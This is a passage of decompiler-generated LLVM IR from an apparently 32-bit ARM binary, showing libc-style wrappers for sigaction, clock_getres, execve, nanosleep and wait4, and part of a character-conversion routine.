  %v0_13e14 = phi i32 [ %arg3, %dec_label_pc_13da0 ], [ %v0_13e14.pre, %dec_label_pc_13e04 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_13da0 ], [ %.v3_13e08, %dec_label_pc_13e04 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_13e14 = icmp eq i32 %v0_13e14, 0
  %.v2_13da8 = select i1 %v2_13e14, i32 0, i32 %v2_13da8
  store i32 %.v2_13da8, i32* @r2, align 4
  store i32 %v0_13e24, i32* %r0.global-to-local, align 4
  %v1_13e28 = call i32 @function_13ea8(i32 %v0_13e24)
  store i32 %v1_13e28, i32* %r0.global-to-local, align 4
  %v0_13e2c = load i32, i32* @r5, align 4
  %v2_13e2c = icmp eq i32 %v0_13e2c, 0
  br i1 %v2_13e2c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_13e14
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13e14, %bb25
  %v0_13e3c.pr = phi i32 [ 0, %dec_label_pc_13e14 ], [ 1, %bb25 ]
  %v1_13e34 = icmp slt i32 %v1_13e28, 0
  br i1 %v1_13e34, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_13e70

thread-pre-split:                                 ; preds = %bb26
  %v2_13e3c = icmp eq i32 %v0_13e3c.pr, 0
  store i32 %v1_13e28, i32* @r4, align 4
  br i1 %v2_13e3c, label %dec_label_pc_13e70, label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %thread-pre-split
  %v2_13e48 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_13e2c, i32* %r0.global-to-local, align 4
  %v2_13e50 = inttoptr i32 %v0_13e2c to i32*
  store i32 %v2_13e48, i32* %v2_13e50, align 4
  %v3_13e50 = load i32, i32* %r0.global-to-local, align 4
  %v4_13e50 = add i32 %v3_13e50, 4
  store i32 %v4_13e50, i32* @r0, align 4
  %v2_13e54 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_13e54, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13e5c = call i32 @function_11d60()
  store i32 %v0_13e5c, i32* %r0.global-to-local, align 4
  %v1_13e64 = load i32, i32* @r5, align 4
  %v2_13e64 = add i32 %v1_13e64, 136
  %v3_13e64 = inttoptr i32 %v2_13e64 to i32*
  %v1_13e6c = load i32, i32* @r5, align 4
  %v2_13e6c = add i32 %v1_13e6c, 132
  %v3_13e6c = inttoptr i32 %v2_13e6c to i32*
  %v0_13e70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_13e48
  %v0_13e70 = phi i32 [ %v1_13e28, %thread-pre-split ], [ %v0_13e70.pre, %dec_label_pc_13e48 ], [ %v1_13e28, %thread-pre-split.thread ]
  store i32 %v0_13e70, i32* %r0.global-to-local, align 4
  store i32 %v3_13da0, i32* @r4, align 4
  store i32 %v6_13da0, i32* @r5, align 4
  ret i32 %v0_13e70

; uselistorder directives
  uselistorder i32 %v0_13e70, { 1, 0 }
  uselistorder i32 %v0_13e2c, { 1, 0, 2 }
  uselistorder i32 %v0_13e24, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_13e70, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_13e04, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_13e84() local_unnamed_addr {
dec_label_pc_13e84:
  %stack_var_-8 = alloca i32, align 4
  %v3_13e84 = load i32, i32* @r4, align 4
  store i32 %v3_13e84, i32* %stack_var_-8, align 4
  %v0_13e88 = load i32, i32* @r0, align 4
  %v0_13e8c = call i32 @function_10a18()
  %v1_13e90 = sub i32 0, %v0_13e88
  %v2_13e94 = inttoptr i32 %v0_13e8c to i32*
  store i32 %v1_13e90, i32* %v2_13e94, align 4
  %v2_13e9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e9c, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_13ea8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ea8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ea8 = load i32, i32* @r4, align 4
  store i32 %v3_13ea8, i32* %stack_var_-8, align 4
  %v1_13eac = load i32, i32* @r1, align 4
  %v2_13eac = inttoptr i32 %v1_13eac to %sigaction*
  %v3_13eac = load i32, i32* @r2, align 4
  %v4_13eac = inttoptr i32 %v3_13eac to %sigaction*
  %v5_13eac = call i32 @sigaction(i32 %arg1, %sigaction* %v2_13eac, %sigaction* %v4_13eac)
  store i32 %v5_13eac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13eac, -4095
  br i1 %tmp, label %dec_label_pc_13ecc, label %dec_label_pc_13ebc

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13ea8
  %v0_13ebc = call i32 @function_10a18()
  %v0_13ec0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ec0 = sub i32 0, %v0_13ec0
  %v2_13ec4 = inttoptr i32 %v0_13ebc to i32*
  store i32 %v1_13ec0, i32* %v2_13ec4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ecc

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13ea8, %dec_label_pc_13ebc
  %v0_13ecc = phi i32 [ %v5_13eac, %dec_label_pc_13ea8 ], [ -1, %dec_label_pc_13ebc ]
  %v2_13ed0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ed0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13ecc

; uselistorder directives
  uselistorder i32 %v5_13eac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ecc, { 1, 0 }
}

define i32 @function_13ed4(i32 %arg1, %timespec* %arg2) local_unnamed_addr {
dec_label_pc_13ed4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ed4 = load i32, i32* @r4, align 4
  store i32 %v3_13ed4, i32* %stack_var_-8, align 4
  %v4_13ed8 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_13ed8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13ed8, -4095
  br i1 %tmp, label %dec_label_pc_13ef8, label %dec_label_pc_13ee8

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13ed4
  %v0_13ee8 = call i32 @function_10a18()
  %v0_13eec = load i32, i32* %r4.global-to-local, align 4
  %v1_13eec = sub i32 0, %v0_13eec
  %v2_13ef0 = inttoptr i32 %v0_13ee8 to i32*
  store i32 %v1_13eec, i32* %v2_13ef0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ed4, %dec_label_pc_13ee8
  %v0_13ef8 = phi i32 [ %v4_13ed8, %dec_label_pc_13ed4 ], [ -1, %dec_label_pc_13ee8 ]
  %v2_13efc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13efc, i32* %r4.global-to-local, align 4
  ret i32 %v0_13ef8

; uselistorder directives
  uselistorder i32 %v4_13ed8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ef8, { 1, 0 }
}

define i32 @function_13f00() local_unnamed_addr {
dec_label_pc_13f00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f00 = load i32, i32* @r4, align 4
  store i32 %v3_13f00, i32* %stack_var_-8, align 4
  %v0_13f04 = load i32, i32* @r0, align 4
  %v1_13f04 = inttoptr i32 %v0_13f04 to i8*
  %v2_13f04 = load i32, i32* @r1, align 4
  %v3_13f04 = inttoptr i32 %v2_13f04 to i8*
  %v4_13f04 = insertvalue [1 x i8*] undef, i8* %v3_13f04, 0
  %v5_13f04 = load i32, i32* @r2, align 4
  %v6_13f04 = inttoptr i32 %v5_13f04 to i8*
  %v7_13f04 = insertvalue [1 x i8*] undef, i8* %v6_13f04, 0
  %v8_13f04 = call i32 @execve(i8* %v1_13f04, [1 x i8*] %v4_13f04, [1 x i8*] %v7_13f04)
  store i32 %v8_13f04, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_13f04, -4095
  br i1 %tmp, label %dec_label_pc_13f24, label %dec_label_pc_13f14

dec_label_pc_13f14:                               ; preds = %dec_label_pc_13f00
  %v0_13f14 = call i32 @function_10a18()
  %v0_13f18 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f18 = sub i32 0, %v0_13f18
  %v2_13f1c = inttoptr i32 %v0_13f14 to i32*
  store i32 %v1_13f18, i32* %v2_13f1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f24

dec_label_pc_13f24:                               ; preds = %dec_label_pc_13f00, %dec_label_pc_13f14
  %v0_13f24 = phi i32 [ %v8_13f04, %dec_label_pc_13f00 ], [ -1, %dec_label_pc_13f14 ]
  %v2_13f28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f28, i32* @r4, align 4
  ret i32 %v0_13f24

; uselistorder directives
  uselistorder i32 %v8_13f04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f24, { 1, 0 }
}

define i32 @function_13f2c() local_unnamed_addr {
dec_label_pc_13f2c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f2c = load i32, i32* @r4, align 4
  store i32 %v3_13f2c, i32* %stack_var_-8, align 4
  %v0_13f34 = load i32, i32* @r0, align 4
  store i32 %v0_13f34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13f34, -4095
  br i1 %tmp, label %dec_label_pc_13f50, label %dec_label_pc_13f40

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f2c
  %v0_13f40 = call i32 @function_10a18()
  %v0_13f44 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f44 = sub i32 0, %v0_13f44
  %v2_13f48 = inttoptr i32 %v0_13f40 to i32*
  store i32 %v1_13f44, i32* %v2_13f48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13f54.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13f50

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f2c, %dec_label_pc_13f40
  %v2_13f54 = phi i32 [ %v3_13f2c, %dec_label_pc_13f2c ], [ %v2_13f54.pre, %dec_label_pc_13f40 ]
  %v0_13f50 = phi i32 [ %v0_13f34, %dec_label_pc_13f2c ], [ -1, %dec_label_pc_13f40 ]
  store i32 %v2_13f54, i32* @r4, align 4
  ret i32 %v0_13f50

; uselistorder directives
  uselistorder i32 %v0_13f34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f50, { 1, 0 }
}

define i32 @function_13f58() local_unnamed_addr {
dec_label_pc_13f58:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f58 = load i32, i32* @r4, align 4
  store i32 %v3_13f58, i32* %stack_var_-8, align 4
  %v0_13f60 = load i32, i32* @r0, align 4
  store i32 %v0_13f60, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13f60, -4095
  br i1 %tmp, label %dec_label_pc_13f7c, label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f58
  %v0_13f6c = call i32 @function_10a18()
  %v0_13f70 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f70 = sub i32 0, %v0_13f70
  %v2_13f74 = inttoptr i32 %v0_13f6c to i32*
  store i32 %v1_13f70, i32* %v2_13f74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13f80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13f7c

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13f58, %dec_label_pc_13f6c
  %v2_13f80 = phi i32 [ %v3_13f58, %dec_label_pc_13f58 ], [ %v2_13f80.pre, %dec_label_pc_13f6c ]
  %v0_13f7c = phi i32 [ %v0_13f60, %dec_label_pc_13f58 ], [ -1, %dec_label_pc_13f6c ]
  store i32 %v2_13f80, i32* @r4, align 4
  ret i32 %v0_13f7c

; uselistorder directives
  uselistorder i32 %v0_13f60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f7c, { 1, 0 }
}

define i32 @function_13f84(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f84:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f84 = load i32, i32* @r4, align 4
  store i32 %v3_13f84, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13fa8, label %dec_label_pc_13f98

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f84
  %v0_13f98 = call i32 @function_10a18()
  %v0_13f9c = load i32, i32* %r4.global-to-local, align 4
  %v1_13f9c = sub i32 0, %v0_13f9c
  %v2_13fa0 = inttoptr i32 %v0_13f98 to i32*
  store i32 %v1_13f9c, i32* %v2_13fa0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13fac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13fa8

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f84, %dec_label_pc_13f98
  %v2_13fac = phi i32 [ %v3_13f84, %dec_label_pc_13f84 ], [ %v2_13fac.pre, %dec_label_pc_13f98 ]
  %v0_13fa8 = phi i32 [ %arg1, %dec_label_pc_13f84 ], [ -1, %dec_label_pc_13f98 ]
  store i32 %v2_13fac, i32* %r4.global-to-local, align 4
  ret i32 %v0_13fa8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fa8, { 1, 0 }
}

define i32 @function_13fb0() local_unnamed_addr {
dec_label_pc_13fb0:
  %v2_13fb4 = load i32, i32* @global_var_26630.305, align 4
  %v2_13fb8 = icmp eq i32 %v2_13fb4, 0
  br i1 %v2_13fb8, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13fb0
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13fb0, %bb
  %v1_13fc0 = phi i32 [ %v2_13fb4, %dec_label_pc_13fb0 ], [ 4096, %bb ]
  ret i32 %v1_13fc0

; uselistorder directives
  uselistorder i32* @global_var_26630.305, { 2, 1, 5, 0, 3, 4 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13fc8() local_unnamed_addr {
dec_label_pc_13fc8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fc8 = load i32, i32* @r4, align 4
  store i32 %v3_13fc8, i32* %stack_var_-8, align 4
  %v0_13fd0 = load i32, i32* @r0, align 4
  store i32 %v0_13fd0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fd0, -4095
  br i1 %tmp, label %dec_label_pc_13fec, label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13fc8
  %v0_13fdc = call i32 @function_10a18()
  %v0_13fe0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fe0 = sub i32 0, %v0_13fe0
  %v2_13fe4 = inttoptr i32 %v0_13fdc to i32*
  store i32 %v1_13fe0, i32* %v2_13fe4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13ff0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %dec_label_pc_13fc8, %dec_label_pc_13fdc
  %v2_13ff0 = phi i32 [ %v3_13fc8, %dec_label_pc_13fc8 ], [ %v2_13ff0.pre, %dec_label_pc_13fdc ]
  %v0_13fec = phi i32 [ %v0_13fd0, %dec_label_pc_13fc8 ], [ -1, %dec_label_pc_13fdc ]
  store i32 %v2_13ff0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13fec

; uselistorder directives
  uselistorder i32 %v0_13fd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fec, { 1, 0 }
}

define i32 @function_13ff4(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13ff4:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_13ff4 = load i32, i32* @r4, align 4
  store i32 %v3_13ff4, i32* %stack_var_-8, align 4
  %v6_13ff8 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_13ff8, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_13ff8, -4095
  br i1 %tmp6, label %dec_label_pc_14018, label %dec_label_pc_14008

dec_label_pc_14008:                               ; preds = %dec_label_pc_13ff4
  %v0_14008 = call i32 @function_10a18()
  %v0_1400c = load i32, i32* %r4.global-to-local, align 4
  %v1_1400c = sub i32 0, %v0_1400c
  %v2_14010 = inttoptr i32 %v0_14008 to i32*
  store i32 %v1_1400c, i32* %v2_14010, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14018

dec_label_pc_14018:                               ; preds = %dec_label_pc_13ff4, %dec_label_pc_14008
  %v0_14018 = phi i32 [ %v6_13ff8, %dec_label_pc_13ff4 ], [ -1, %dec_label_pc_14008 ]
  %v2_1401c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1401c, i32* %r4.global-to-local, align 4
  ret i32 %v0_14018

; uselistorder directives
  uselistorder i32 %v6_13ff8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14018, { 1, 0 }
}

define i32 @function_14020(i32 %arg1) local_unnamed_addr {
dec_label_pc_14020:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14020 = load i32, i32* @r4, align 4
  store i32 %v3_14020, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_26648.404 to i32), i32* %r4.global-to-local, align 4
  %v2_14028 = load i32, i32* @global_var_26648.404, align 4
  %v2_1402c = icmp eq i32 %v2_14028, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_1402c, label %dec_label_pc_1403c, label %dec_label_pc_14048

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14020
  %v2_1403c = call i32 @function_1571c(i32* null)
  %v1_14040 = icmp slt i32 %v2_1403c, 0
  br i1 %v1_14040, label %dec_label_pc_14068, label %dec_label_pc_14048thread-pre-split

dec_label_pc_14048thread-pre-split:               ; preds = %dec_label_pc_1403c
  %v0_1404c.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_14048.pre = load i32, i32* @global_var_26648.404, align 4
  br label %dec_label_pc_14048

dec_label_pc_14048:                               ; preds = %dec_label_pc_14048thread-pre-split, %dec_label_pc_14020
  %v2_14048 = phi i32 [ %v2_14048.pre, %dec_label_pc_14048thread-pre-split ], [ %v2_14028, %dec_label_pc_14020 ]
  %v1_14054 = phi i32 [ %v0_1404c.pr, %dec_label_pc_14048thread-pre-split ], [ %arg1, %dec_label_pc_14020 ]
  %v2_1404c = icmp eq i32 %v1_14054, 0
  store i32 %v2_14048, i32* %r4.global-to-local, align 4
  br i1 %v2_1404c, label %dec_label_pc_1406c, label %dec_label_pc_1405c

dec_label_pc_1405c:                               ; preds = %dec_label_pc_14048
  %v2_14054 = add i32 %v1_14054, %v2_14048
  %v1_1405c = inttoptr i32 %v2_14054 to i32*
  %v2_1405c = call i32 @function_1571c(i32* %v1_1405c)
  %v1_14060 = icmp slt i32 %v2_1405c, 0
  br i1 %v1_14060, label %dec_label_pc_14068, label %dec_label_pc_1405c.dec_label_pc_1406c_crit_edge

dec_label_pc_1405c.dec_label_pc_1406c_crit_edge:  ; preds = %dec_label_pc_1405c
  %v0_1406c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1406c

dec_label_pc_14068:                               ; preds = %dec_label_pc_1405c, %dec_label_pc_1403c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1406c

dec_label_pc_1406c:                               ; preds = %dec_label_pc_1405c.dec_label_pc_1406c_crit_edge, %dec_label_pc_14048, %dec_label_pc_14068
  %v0_1406c = phi i32 [ %v0_1406c.pre, %dec_label_pc_1405c.dec_label_pc_1406c_crit_edge ], [ %v2_14048, %dec_label_pc_14048 ], [ -1, %dec_label_pc_14068 ]
  %v2_14070 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14070, i32* @r4, align 4
  ret i32 %v0_1406c

; uselistorder directives
  uselistorder i32 %v2_14048, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 28, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 25, 26, 23, 24, 21, 22, 19, 20, 17, 18, 27, 2 }
  uselistorder label %dec_label_pc_1406c, { 2, 0, 1 }
}

define i32 @function_14078() local_unnamed_addr {
dec_label_pc_14078:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14078 = load i32, i32* @r4, align 4
  store i32 %v3_14078, i32* %stack_var_-8, align 4
  %v0_1407c = load i32, i32* @r0, align 4
  %v1_1407c = load i32, i32* @r1, align 4
  %v2_1407c = load i32, i32* @r2, align 4
  %v3_1407c = load i32, i32* @r3, align 4
  %v4_1407c = inttoptr i32 %v3_1407c to %rusage*
  %v5_1407c = call i32 @wait4(i32 %v0_1407c, i32 %v1_1407c, i32 %v2_1407c, %rusage* %v4_1407c)
  store i32 %v5_1407c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1407c, -4095
  br i1 %tmp, label %dec_label_pc_1409c, label %dec_label_pc_1408c

dec_label_pc_1408c:                               ; preds = %dec_label_pc_14078
  %v0_1408c = call i32 @function_10a18()
  %v0_14090 = load i32, i32* %r4.global-to-local, align 4
  %v1_14090 = sub i32 0, %v0_14090
  %v2_14094 = inttoptr i32 %v0_1408c to i32*
  store i32 %v1_14090, i32* %v2_14094, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1409c

dec_label_pc_1409c:                               ; preds = %dec_label_pc_14078, %dec_label_pc_1408c
  %v0_1409c = phi i32 [ %v5_1407c, %dec_label_pc_14078 ], [ -1, %dec_label_pc_1408c ]
  %v2_140a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140a0, i32* @r4, align 4
  ret i32 %v0_1409c

; uselistorder directives
  uselistorder i32 %v5_1407c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1409c, { 1, 0 }
}

define i32 @function_140a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_140a4:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_140a8 = icmp eq i32 %arg1, 0
  br i1 %v2_140a8, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_140a4
  br label %bb11

bb:                                               ; preds = %dec_label_pc_140a4
  %v3_140b0 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_140d8 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_140cc = phi i32 [ %arg1, %.thread ], [ %v3_140b0, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_140c4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_140d0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_140d0, i32* %stack_var_-16, align 4
  store i32 %v0_140d8, i32* %stack_var_-12, align 4
  %v5_140e0 = inttoptr i32 %v0_140cc to i8*
  %v6_140e0 = call i32 @function_14114(i8* %v5_140e0, i32 %v2_140c4, i32 1, i32 16, i32 %arg3)
  %v2_140e4 = icmp eq i32 %v6_140e0, 0
  br i1 %v2_140e4, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_140f0 = phi i32 [ %v6_140e0, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_140f0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_140f4() local_unnamed_addr {
dec_label_pc_140f4:
  %v0_14100 = load i32, i32* @r2, align 4
  store i32 %v0_14100, i32* @r3, align 4
  %v0_14108 = load i32, i32* @r0, align 4
  %v1_14108 = load i32, i32* @r1, align 4
  %v5_14108 = inttoptr i32 %v0_14108 to i8*
  %v6_14108 = call i32 @function_14114(i8* %v5_14108, i32 %v1_14108, i32 -1, i32 %v0_14100, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_14108
}

define i32 @function_14114(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14114:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14114 = load i32, i32* @r4, align 4
  store i32 %v3_14114, i32* %stack_var_-8, align 4
  %v10_14118 = icmp eq i32 %tmp, %arg2
  br i1 %v10_14118, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14114
  %v0_141201 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14134

bb:                                               ; preds = %dec_label_pc_14114
  %v4_1411c = icmp eq i8* %arg1, null
  %v0_14120 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_1411c, label %dec_label_pc_14134, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14170

dec_label_pc_14134:                               ; preds = %.thread, %bb
  %v1_14174.ph = phi i32 [ %v0_14120, %bb ], [ %v0_141201, %.thread ]
  %v2_141243.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_14134 = icmp eq i8* %arg1, null
  store i32 %v2_141243.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_14134, label %.thread4, label %dec_label_pc_14168

.thread4:                                         ; preds = %dec_label_pc_14134
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_14170

dec_label_pc_1414c:                               ; preds = %dec_label_pc_14188
  %v0_1414c = call i32 @function_10a18()
  store i32 %v0_1414c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14158 = inttoptr i32 %v0_1414c to i32*
  store i32 84, i32* %v2_14158, align 4
  %v0_141c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_141c4

dec_label_pc_14160:                               ; preds = %dec_label_pc_14198
  %v3_1419c = zext i8 %v2_1419c to i32
  store i32 %v3_1419c, i32* @lr, align 4
  br label %dec_label_pc_141b8

dec_label_pc_14168:                               ; preds = %dec_label_pc_14134
  store i32 %v2_141243.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14170

dec_label_pc_14170:                               ; preds = %bb27, %.thread4, %dec_label_pc_14168
  %v1_1417420 = phi i32 [ %v0_14120, %bb27 ], [ %v1_14174.ph, %.thread4 ], [ %v1_14174.ph, %dec_label_pc_14168 ]
  %v2_1419814 = phi i32 [ %tmp, %bb27 ], [ %v2_141243.ph, %.thread4 ], [ %v2_141243.ph, %dec_label_pc_14168 ]
  %v1_14170 = load i32, i32* @r3, align 4
  %v3_14170 = icmp uge i32 %v1_1417420, %v1_14170
  %v1_14170.v1_1417420 = select i1 %v3_14170, i32 %v1_14170, i32 %v1_1417420
  store i32 %v1_14170.v1_1417420, i32* %r4.global-to-local, align 4
  %v1_1417c = inttoptr i32 %arg2 to i32*
  %v2_1417c = load i32, i32* %v1_1417c, align 4
  store i32 %v2_1417c, i32* @lr, align 4
  store i32 %v1_14170.v1_1417420, i32* %r0.global-to-local, align 4
  %v2_141b08 = icmp eq i32 %v1_14170.v1_1417420, 0
  br i1 %v2_141b08, label %dec_label_pc_141b8, label %dec_label_pc_14188

dec_label_pc_14188:                               ; preds = %dec_label_pc_14170, %dec_label_pc_141a8.dec_label_pc_14188_crit_edge
  %v2_14198 = phi i32 [ %v2_141a8, %dec_label_pc_141a8.dec_label_pc_14188_crit_edge ], [ %v2_1419814, %dec_label_pc_14170 ]
  %v0_14190 = phi i32 [ %v0_14188.pre, %dec_label_pc_141a8.dec_label_pc_14188_crit_edge ], [ %v2_1417c, %dec_label_pc_14170 ]
  %v1_14188 = inttoptr i32 %v0_14190 to i32*
  %v2_14188 = load i32, i32* %v1_14188, align 4
  %v1_14190 = add i32 %v0_14190, 4
  store i32 %v1_14190, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_14188, 127
  br i1 %tmp36, label %dec_label_pc_1414c, label %dec_label_pc_14198

dec_label_pc_14198:                               ; preds = %dec_label_pc_14188
  %v1_14198 = trunc i32 %v2_14188 to i8
  %v3_14198 = inttoptr i32 %v2_14198 to i8*
  store i8 %v1_14198, i8* %v3_14198, align 1
